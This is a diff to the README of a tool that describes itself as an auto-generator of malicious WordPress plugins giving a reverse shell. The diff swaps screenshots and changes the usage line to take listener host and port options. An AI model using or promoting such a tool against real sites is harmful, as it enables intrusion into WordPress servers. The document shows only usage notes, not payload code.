@@ -2,14 +2,12 @@
 
 **Auto Generator Malicious Plugins WordPress `(Reverse Shell)`**
 
-![](/1.png)
-
-Tested Interfaces: <kbd>eth0</kbd> - <kbd>tun0</kbd> - <kbd>enp0s3</kbd>
+![](/screenshot.png)
 
 - <kbd>Use</kbd>
 
 ```cmd
-root@kali:~# WPGen eth0 443
+root@kali:~# WPGen -l <LHOST> -p <LPORT>
 ```
 
 ![](/2.png)
